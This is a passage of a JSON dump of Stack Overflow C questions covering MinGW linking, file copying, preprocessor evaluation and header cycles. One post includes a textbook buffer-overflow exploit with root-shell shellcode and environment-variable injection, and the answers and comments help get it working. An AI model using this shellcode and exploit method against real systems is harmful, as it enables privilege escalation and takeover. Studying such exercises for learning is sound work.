<code>libwinpthread-1.dll</code>, and <code>libstdc++-6.dll</code>.</p>\n\n<p>Following the accepted answer from <a href=\"https://stackoverflow.com/questions/18138635/mingw-exe-requires-a-few-gcc-dlls-regardless-of-the-code\">MinGW .exe requires a few gcc dll&#39;s regardless of the code?</a>, I tried adding <code>-static -static-libgcc -static-libstdc++</code> to my <code>./configure</code> script parameters:</p>\n\n<pre>./configure -static-libgcc -static-libstdc++ -static -lpthread --without-qt --without-gtk --without-python --without-imagemagick</pre>\n\n<p>But I got this error:</p>\n\n<pre>configure: error: unrecognized option: -static-libgcc</pre>\n\n<p>What are the correct parameters to pass to the configure script so the MinGW dependencies are statically linked to ZBar? </p>\n"}, {"tags": ["c", "linux", "environment-variables", "buffer-overflow", "exploit"], "answers": [{"comments": [{"owner": {"reputation": 19, "user_id": 6260422, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b5cac881245385405b9a4bc1765bf50e?s=128&d=identicon&r=PG&f=1", "display_name": "C. Ghali", "link": "https://stackoverflow.com/users/6260422/c-ghali"}, "edited": false, "score": 0, "creation_date": 1461949244, "post_id": 36885384, "comment_id": 61446375, "body": "As far as I remember, the book said that the above exploit has an advantage that it doesn&#39;t need NOP sled.  However, your idea of looking into <code>&#47;proc&#47;&lt;&lt;pid&gt;&gt;&#47;maps</code> helped in getting the based stack address of the current process. Now the exploit works."}], "tags": [], "owner": {"reputation": 10281, "user_id": 51760, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/SI89u.jpg?s=128&g=1", "display_name": "Aif", "link": "https://stackoverflow.com/users/51760/aif"}, "is_accepted": false, "score": 1, "last_activity_date": 1461748509, "creation_date": 1461748509, "answer_id": 36885384, "question_id": 36885127, "link": "https://stackoverflow.com/questions/36885127/buffer-overflow-using-environment-variables/36885384#36885384", "title": "Buffer overflow using environment variables", "body": "<p>The idea with such exploitation is to use <a href=\"https://en.wikipedia.org/wiki/NOP_slide\" rel=\"nofollow\">nop sled</a> before your actual shellcode. That way, event if your address approximation is bad, there's more chance to hit nop, until your shellcode gets executed.</p>\n\n<p>To get that address, you can cheat (for a start) looking at memory mappings in <code>/proc/&lt;&lt;pid&gt;&gt;/maps</code>.</p>\n"}], "owner": {"reputation": 19, "user_id": 6260422, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b5cac881245385405b9a4bc1765bf50e?s=128&d=identicon&r=PG&f=1", "display_name": "C. Ghali", "link": "https://stackoverflow.com/users/6260422/c-ghali"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1335, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1461748509, "creation_date": 1461747810, "question_id": 36885127, "link": "https://stackoverflow.com/questions/36885127/buffer-overflow-using-environment-variables", "title": "Buffer overflow using environment variables", "body": "<p>I'm trying this code inspired by the \"Hacking: The Art of Exploitation\" book. It involves exploiting a buffer overflow using the environment variable. The exploitation code is:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n\nchar shellcode[] = \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\"\n\"\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\\xe1\\xcd\"\n\"\\x80\";\n\nint main(int argc, char *argv[]) {\n  char *env[2] = {shellcode, 0};\n  unsigned int i, ret;\n\n  char *buffer = (char *)malloc(160);\n\n  ret = 0xbffffffa - sizeof(shellcode) - strlen(\"./auth_overflow\");\n\n  for (i = 0; i &lt; 160; i += 4)\n    *((unsigned int *)(buffer + i)) = ret;\n\n  execle(\"./auth_overflow\", \"auth_overflow\", buffer, (char *)NULL, env);\n  free(buffer);\n}\n</code></pre>\n\n<p>The problem is the base address <code>0xbffffffa</code>. I read <a href=\"https://stackoverflow.com/questions/16864812/execle-also-specifies-the-environment-what-does-that-mean\">here</a> that the reason for this address is because \"the Linux kernel is implemented like so\". Still the exploit is not working and resulting in a segmentation fault.</p>\n\n<p>I'm running <code>Ubuntu 14.04</code> with Kernel version <code>3.13.0-83-generic</code> on a 64-bit machine and I'm compiling the exploitation code using the following command:</p>\n\n<pre><code>gcc -m32 -fno-stack-protector -z execstack -g exploit.c -o exploit\n</code></pre>\n\n<p>I also disabled ASLR.</p>\n\n<p>Any ideas on how to determine this based address?</p>\n\n<p>Thanks for the help.</p>\n"}, {"tags": ["c", "linux", "directory", "copy"], "comments": [{"owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "edited": false, "score": 0, "creation_date": 1461748052, "post_id": 36885106, "comment_id": 61335127, "body": "Can you describe the problem? File is not copied? Rights are not set?"}, {"owner": {"reputation": 25, "user_id": 4728257, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/a8d3d00617275465c721e8fc43323249?s=128&d=identicon&r=PG&f=1", "display_name": "user4728257", "link": "https://stackoverflow.com/users/4728257/user4728257"}, "reply_to_user": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "edited": false, "score": 0, "creation_date": 1461748914, "post_id": 36885106, "comment_id": 61335657, "body": "the file is copied into the same location, but I want to send the copied file into a chosen, different destination instead of the copying a file into the same location as the original file."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 2, "creation_date": 1461749568, "post_id": 36885106, "comment_id": 61336145, "body": "How are you calling your program?  As coded, all you need to do is give it the full path name of the target file and the source file should be copied there.  And you need to check the return value from <code>fputc()</code> along with <code>fclose()</code> on the target file."}, {"owner": {"reputation": 25, "user_id": 4728257, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/a8d3d00617275465c721e8fc43323249?s=128&d=identicon&r=PG&f=1", "display_name": "user4728257", "link": "https://stackoverflow.com/users/4728257/user4728257"}, "edited": false, "score": 0, "creation_date": 1462269149, "post_id": 36885106, "comment_id": 61554665, "body": "I am able to copy files eg. ./a.out 1.c 2.c successfully, if 2.c does not exist."}], "owner": {"reputation": 25, "user_id": 4728257, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/a8d3d00617275465c721e8fc43323249?s=128&d=identicon&r=PG&f=1", "display_name": "user4728257", "link": "https://stackoverflow.com/users/4728257/user4728257"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 63, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1461748822, "creation_date": 1461747759, "last_edit_date": 1461748822, "question_id": 36885106, "link": "https://stackoverflow.com/questions/36885106/how-to-send-a-copied-file-to-a-chosen-destination-and-or-directory-in-c", "title": "How to send a copied file to a chosen destination and/or directory in C?", "body": "<p>I have trouble searching for a solution on how to send a successfully, copied file to a chosen destination and/or directory in C, instead of copying a file into the same destination. How do you do that? what should I do to fix this problem?</p>\n\n<p>Code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/stat.h&gt;\n\nint main(int argc, char *file[])\n{\n    int ch;  //ch - character no.                               \n    struct stat sb;\n    FILE *source, *target;\n    /* from http://stackoverflow.com/questions/30215462/how-to-get-the-source-  files-the-file-which-i-want-to-copy-and-the-copied-file/30217023#30217023 */\n    if (argc &lt;= 2) {\n        printf(\"Enter source and destination file names\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    if ( strcmp(file[1], file[2]) ==0 )\n    {\n        printf(\"the files are the same\\n\");\n        exit(1);\n    }\n    /* if ( file[2] != NULL)\n    {\n        printf(\"the destination file exists\\n\");\n        exit(1);\n    }*/\n    source = fopen(file[1], \"r\");//getting and opening source file\n    if( source == NULL ) {\n        printf(\"Press any key to exit...\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    target = fopen(file[2], \"w\");//getting and opening destination file\n\n    if( target == NULL ) {\n        fclose(source);\n        printf(\"Press any key to exit...\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    while( ( ch = fgetc(source) ) != EOF )\n        fputc(ch, target);\n\n    fclose(source);\n    fclose(target);\n    printf(\"File copied successfully.\\n\");\n    /* from http://stackoverflow.com/questions/30215462/how-to-get-the-source-files-the-file-which-i-want-to-copy-and-the-copied-file/30217023#30217023 */\n    if (stat(file[1], &amp;sb) == -1) {\n        perror(\"stat\");\n        exit(1); //exit(EXIT_SUCCESS);\n    }\n    else\n    if (chmod(file[2], sb.st_mode &amp; 07777))//http://stackoverflow.com/questions/18032574/how-can-i-copy-permissions-from-a-file-that-already-exists\n    {\n        perror(\"chmod\");\n    }\n\n    printf(\"Source File: %s, Inode number: %d, Mode: 0x%04X\\n\", file[1], (unsigned)sb.st_ino, (unsigned)sb.st_mode);\n\n    if (stat(file[2], &amp;sb) == -1) {\n        perror(\"stat\");\n        exit(1);\n    }\n\n    char *str;\n    str = (char *) malloc(15);\n    strcpy(str, file[2]);\n\n    if (stat(file[2], &amp;sb) == -1) {//http://stackoverflow.com/questions/7430248/creating-a-new-directory-in-c\n        mkdir(file[2], 0700);\n    }\n    printf(\"Destination File: %s, inode number: %d, Address = %u, Mode: 0x%04X\\n\", file[2], (unsigned)sb.st_ino, str, (unsigned)sb.st_mode);\n\n    free(str);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "compilation", "c-preprocessor"], "comments": [{"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1461747469, "post_id": 36884887, "comment_id": 61334713, "body": "test1)initial value is no evaluation at the time of execution. test3)initial value  will no evaluation at the time of execution by inference when outputting the code."}, {"owner": {"reputation": 169, "user_id": 1382272, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/3f2093ff903c4d45e922ecef6f247376?s=128&d=identicon&r=PG", "display_name": "user1382272", "link": "https://stackoverflow.com/users/1382272/user1382272"}, "reply_to_user": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1461747710, "post_id": 36884887, "comment_id": 61334893, "body": "Let&#39;s says computation then :)"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1461747857, "post_id": 36884887, "comment_id": 61334983, "body": "Actually your question isn&#39;t at all about <i>precprocessor constant evaluation</i>,"}, {"owner": {"reputation": 2145, "user_id": 4849573, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/096fb4358973b1d406f85d2b0eeec9c2?s=128&d=identicon&r=PG&f=1", "display_name": "ckruczek", "link": "https://stackoverflow.com/users/4849573/ckruczek"}, "edited": false, "score": 0, "creation_date": 1461748095, "post_id": 36884887, "comment_id": 61335162, "body": "How about you give it try and see whats the result ;)"}, {"owner": {"reputation": 169, "user_id": 1382272, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/3f2093ff903c4d45e922ecef6f247376?s=128&d=identicon&r=PG", "display_name": "user1382272", "link": "https://stackoverflow.com/users/1382272/user1382272"}, "edited": false, "score": 0, "creation_date": 1461748189, "post_id": 36884887, "comment_id": 61335214, "body": "I&#39;m not pretty sure I understand what you mean. Do you mean that the executable will not compute anything ? So test2 will be replaced in test3 and test3 will be computed ?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1461748683, "post_id": 36884887, "comment_id": 61335514, "body": "@user1382272 see my answer below."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1461756081, "post_id": 36884887, "comment_id": 61340833, "body": "Macros are not even &quot;variables&quot;. As much as copy/paste in the editor is not. And they are also no constants."}], "answers": [{"comments": [{"owner": {"reputation": 1093, "user_id": 1571801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b739aed4dad18fc8844f52352fd554a2?s=128&d=identicon&r=PG", "display_name": "atturri", "link": "https://stackoverflow.com/users/1571801/atturri"}, "edited": false, "score": 2, "creation_date": 1461749413, "post_id": 36885323, "comment_id": 61336008, "body": "Note that the value for <code>test3</code> may also be computed during execution depending on the compiler&#39;s optimization settings. For debugging settings it&#39;s not unusual for the <code>test3</code> value to be computed during debugging."}, {"owner": {"reputation": 169, "user_id": 1382272, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/3f2093ff903c4d45e922ecef6f247376?s=128&d=identicon&r=PG", "display_name": "user1382272", "link": "https://stackoverflow.com/users/1382272/user1382272"}, "edited": false, "score": 0, "creation_date": 1461749547, "post_id": 36885323, "comment_id": 61336123, "body": "Thank you very much ! I still have one : let&#39;s say that test3 = MY_VARIABLE + j; where j is a variable updated at each loop iteration. Will it also be computed during the compilation if the optimization is set ?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 1093, "user_id": 1571801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b739aed4dad18fc8844f52352fd554a2?s=128&d=identicon&r=PG", "display_name": "atturri", "link": "https://stackoverflow.com/users/1571801/atturri"}, "edited": false, "score": 0, "creation_date": 1461749565, "post_id": 36885323, "comment_id": 61336139, "body": "@atturri that may be true, for example if <code>SomeFunction</code> returns a constant."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 169, "user_id": 1382272, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/3f2093ff903c4d45e922ecef6f247376?s=128&d=identicon&r=PG", "display_name": "user1382272", "link": "https://stackoverflow.com/users/1382272/user1382272"}, "edited": false, "score": 0, "creation_date": 1461749690, "post_id": 36885323, "comment_id": 61336233, "body": "@user1382272 of course <code>test3 = MY_VARIABLE + j</code> will be computed after each loop iteration at run time, because <code>j</code> is not constant. What else would you expect?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 169, "user_id": 1382272, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/3f2093ff903c4d45e922ecef6f247376?s=128&d=identicon&r=PG", "display_name": "user1382272", "link": "https://stackoverflow.com/users/1382272/user1382272"}, "edited": false, "score": 0, "creation_date": 1461749756, "post_id": 36885323, "comment_id": 61336281, "body": "@user1382272 you understand that <code>test3 = MY_VARIABLE + j</code> is <b>strictly</b> the same as <code>test3 = 5 + j</code>."}], "tags": [], "owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "is_accepted": true, "score": 1, "last_activity_date": 1461748344, "creation_date": 1461748344, "answer_id": 36885323, "question_id": 36884887, "link": "https://stackoverflow.com/questions/36884887/preprocessor-constant-evaluation/36885323#36885323", "title": "Preprocessor constant evaluation", "body": "<p>As you have already understood, the C preprocessor merely replaces the macros before the actual compilation takes place, therefore I stripped out all preprocessor related stuff.</p>\n\n<p>In <strong>this</strong> code no evaluation takes place during execution because the compiler calculates 5*5 during compile time and by inference is can also evaluate all other constants during compilation:</p>\n\n<pre><code>int main() {\n    int test1 = 5 * 5;\n    int test2 = 5;\n    int test3 = 5 * test2;\n}\n</code></pre>\n\n<p>The exact equivalent of the preceeding code fragment is:</p>\n\n<pre><code>int main() {\n    int test1 = 25;\n    int test2 = 5;\n    int test3 = 25;\n}\n</code></pre>\n\n<p>But in following code <code>test3</code> is evaluated during run time, because the value of <code>test2</code> cannot be determined during compile time, because it depends on the return value of <code>SomeFunction</code> that can only be known at run time.</p>\n\n<pre><code>int main() {\n    int test1 = 5 * 5;\n    int test2 = SomeFunction();        \n    int test3 = 5 * test2;\n}\n</code></pre>\n"}], "owner": {"reputation": 169, "user_id": 1382272, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/3f2093ff903c4d45e922ecef6f247376?s=128&d=identicon&r=PG", "display_name": "user1382272", "link": "https://stackoverflow.com/users/1382272/user1382272"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 232, "favorite_count": 0, "accepted_answer_id": 36885323, "answer_count": 1, "score": 1, "last_activity_date": 1461748587, "creation_date": 1461747216, "last_edit_date": 1461748587, "question_id": 36884887, "link": "https://stackoverflow.com/questions/36884887/preprocessor-constant-evaluation", "title": "Preprocessor constant evaluation", "body": "<p>I have a small question about the preprocessor constants in C. I understand what is the goal of this kind of \"variable\" and how it works. However, I have a small question about their evaluation. Let's consider a small example :</p>\n\n<pre><code>#define MY_VARIABLE 5\n\nint main() {\n    int test1 = MY_VARIABLE*5;\n    int test2 = 5;\n    int test3 = MY_VARIABLE*test2;\n}\n</code></pre>\n\n<p>During the preprocessor step, <code>MY_VARIABLE</code> will be replaced by 5 in the code. My question is: will <code>test1</code> be computed during the compilation or during the execution ? Is that correct that <code>test3</code> will be computed during the execution ? This question may seem a bit weird and useless but I'm studying a program where this kind of things is done a lot of times and I would like to know if this kind of operation can slow the execution.</p>\n"}, {"tags": ["c++", "c", "header"], "comments": [{"owner": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1461747458, "post_id": 36884532, "comment_id": 61334705, "body": "Which of the two tagged programming languages are you <i>actually</i> using?"}], "answers": [{"comments": [{"owner": {"reputation": 62, "user_id": 3992527, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5ee68eaab1c61176c4b0bed4a9bc6dad?s=128&d=identicon&r=PG&f=1", "display_name": "Mohamad Yassine", "link": "https://stackoverflow.com/users/3992527/mohamad-yassine"}, "edited": false, "score": 0, "creation_date": 1461920396, "post_id": 36884906, "comment_id": 61427330, "body": "But it gave me a warning because I&#39;m using a method found in set.h"}, {"owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "reply_to_user": {"reputation": 62, "user_id": 3992527, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5ee68eaab1c61176c4b0bed4a9bc6dad?s=128&d=identicon&r=PG&f=1", "display_name": "Mohamad Yassine", "link": "https://stackoverflow.com/users/3992527/mohamad-yassine"}, "edited": false, "score": 0, "creation_date": 1461920432, "post_id": 36884906, "comment_id": 61427350, "body": "@MohamadYassine what&#39;s the warning?"}, {"owner": {"reputation": 62, "user_id": 3992527, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5ee68eaab1c61176c4b0bed4a9bc6dad?s=128&d=identicon&r=PG&f=1", "display_name": "Mohamad Yassine", "link": "https://stackoverflow.com/users/3992527/mohamad-yassine"}, "edited": false, "score": 0, "creation_date": 1461920492, "post_id": 36884906, "comment_id": 61427398, "body": "Assignment makes pointer from integer without cast. I&#39;m using generate_subsets method"}, {"owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "reply_to_user": {"reputation": 62, "user_id": 3992527, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5ee68eaab1c61176c4b0bed4a9bc6dad?s=128&d=identicon&r=PG&f=1", "display_name": "Mohamad Yassine", "link": "https://stackoverflow.com/users/3992527/mohamad-yassine"}, "edited": false, "score": 0, "creation_date": 1461920571, "post_id": 36884906, "comment_id": 61427455, "body": "Is it the first argument? it is expacting a pointer to integer, not a integer."}, {"owner": {"reputation": 62, "user_id": 3992527, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5ee68eaab1c61176c4b0bed4a9bc6dad?s=128&d=identicon&r=PG&f=1", "display_name": "Mohamad Yassine", "link": "https://stackoverflow.com/users/3992527/mohamad-yassine"}, "edited": false, "score": 0, "creation_date": 1461920746, "post_id": 36884906, "comment_id": 61427572, "body": "And also this warning implicit declaration of function &#39;generate_subset&#39;"}, {"owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "reply_to_user": {"reputation": 62, "user_id": 3992527, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5ee68eaab1c61176c4b0bed4a9bc6dad?s=128&d=identicon&r=PG&f=1", "display_name": "Mohamad Yassine", "link": "https://stackoverflow.com/users/3992527/mohamad-yassine"}, "edited": false, "score": 0, "creation_date": 1461920814, "post_id": 36884906, "comment_id": 61427628, "body": "That means you should include <code>set.h</code> in this source file."}, {"owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "reply_to_user": {"reputation": 62, "user_id": 3992527, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5ee68eaab1c61176c4b0bed4a9bc6dad?s=128&d=identicon&r=PG&f=1", "display_name": "Mohamad Yassine", "link": "https://stackoverflow.com/users/3992527/mohamad-yassine"}, "edited": false, "score": 0, "creation_date": 1461920918, "post_id": 36884906, "comment_id": 61427709, "body": "Glad to know it helps. :)"}], "tags": [], "owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "is_accepted": true, "score": 1, "last_activity_date": 1461747247, "creation_date": 1461747247, "answer_id": 36884906, "question_id": 36884532, "link": "https://stackoverflow.com/questions/36884532/i-have-codependent-headers-in-c-which-is-giving-me-errors-how-can-i-remove-it/36884906#36884906", "title": "I have codependent headers in C which is giving me errors. How can I remove it?", "body": "<p>Use forward declarations when you need to reference the struct in another header file, the header does not need to know the details of the struct, try this in <code>tree.h</code>:</p>\n\n<pre><code> #ifndef tree\n #define tree\n\n #include \"common.h\"\n // #include \"set.h\"  &lt;-- don't include set.h\n\n typedef struct Set Set;\n\n /*Tree Structure*/\n typedef struct\n {\n     Set *set;\n     unsigned int setLength;\n     int vertexLength;\n     ...\n } TreeNode;\n</code></pre>\n\n<p>in <code>set.h</code>:</p>\n\n<pre><code>typedef struct Set Set;\nstruct Set\n{\n    int combinationLength;\n    int* combination;\n} Set;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5754, "user_id": 2867061, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/cd59dfa471d99e7c625b5dcb191ec8ae?s=128&d=identicon&r=PG&f=1", "display_name": "user31264", "link": "https://stackoverflow.com/users/2867061/user31264"}, "is_accepted": false, "score": 0, "last_activity_date": 1461751955, "creation_date": 1461751955, "answer_id": 36886810, "question_id": 36884532, "link": "https://stackoverflow.com/questions/36884532/i-have-codependent-headers-in-c-which-is-giving-me-errors-how-can-i-remove-it/36886810#36886810", "title": "I have codependent headers in C which is giving me errors. How can I remove it?", "body": "<p>You write:</p>\n\n<pre><code>#define tree\n</code></pre>\n\n<p>and later in the same file:</p>\n\n<pre><code>int get_number_of_leaves(Tree *tree);\n</code></pre>\n\n<p>So <code>tree</code> is both a macro name and a variable.  Not surprising that you receive errors!</p>\n\n<p>Thats why macro names should not contain small characters, never.</p>\n"}], "owner": {"reputation": 62, "user_id": 3992527, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5ee68eaab1c61176c4b0bed4a9bc6dad?s=128&d=identicon&r=PG&f=1", "display_name": "Mohamad Yassine", "link": "https://stackoverflow.com/users/3992527/mohamad-yassine"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 239, "favorite_count": 0, "accepted_answer_id": 36884906, "answer_count": 2, "score": 0, "last_activity_date": 1461751955, "creation_date": 1461746269, "question_id": 36884532, "link": "https://stackoverflow.com/questions/36884532/i-have-codependent-headers-in-c-which-is-giving-me-errors-how-can-i-remove-it", "title": "I have codependent headers in C which is giving me errors. How can I remove it?", "body": "<p>The tree.h file:</p>\n\n<pre><code>#ifndef tree\n#define tree\n\n#include \"common.h\"\n#include \"set.h\"\n\n/*Tree Structure*/\ntypedef struct\n{\n    Set *set;\n    unsigned int setLength;\n    int vertexLength;\n    int *vertex;\n    int idle;\n    int parent;\n    int level;\n    int numberOfChildren;\n} TreeNode;\n\ntypedef struct\n{\n    TreeNode* node;\n    int nodeLength;\n    int height;\n} Tree;\n\nTree* fill_tree(char *filename, int worldSize, int rank);\nint get_number_of_leaves(Tree *tree);\nTreeNode get_tree_node(int index, Tree* tree);\nTreeNode* get_tree_nodes(Tree* tree);\nint get_tree_nodes_length(Tree* tree);\nvoid compute_level(int u, Tree* tree);\nvoid print_tree(Tree* tree);\nint get_max_level(Tree* tree);\nint* create_task_list(Tree* tree, int* taskListLength, int rank);\nint* map(int* taskList, int taskListLength, int* mapLength, int rank);\nvoid generate_combination_sets(Tree* tree, int nodePerProcess, int rank);\n\n#endif\n</code></pre>\n\n<p>The set.h file:</p>\n\n<pre><code>#ifndef set\n#define set\n\n#include \"common.h\"\n#include \"tree.h\"\n\n/*Tree Structure*/\ntypedef struct\n{\n    int combinationLength;\n    int* combination;\n} Set;\n\nSet* generate_subsets(int* vertex, int vertexLength, unsigned int pow_set_size, int rank);\nSet* match(Set* parent, unsigned int parentLength, Set* child, unsigned int childLength, TreeNode childNode, TreeNode parentNode, unsigned int* solutionLength, Graph* g, int rank);\nint* union_operation(int* parenteCombination, int parentCombinationLength, int* childCombination, int childCombinationLength, unsigned int* mergedLength, int rank);\nint not_in_solution(Set* solution, int solutionLength , int* merged, unsigned int mergedLength);\nvoid print_set(Set set);\n\n#endif\n</code></pre>\n\n<p>The common.h file:</p>\n\n<pre><code>#ifndef common\n#define common\n\n// Libraries\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;math.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;limits.h&gt;\n#include \"mpi.h\"\n#include \"graph.h\"\n#define true 1\n#define false 0\n#endif\n</code></pre>\n\n<p>I have errors that the tree and the set header files are codependent, and the compiler is giving me an error that set is not found in tree.h and likewise for set. Should I include all the fiels in the common.h file?</p>\n"}, {"tags": ["c++", "c", "linux", "kernel"], "comments": [{"owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", 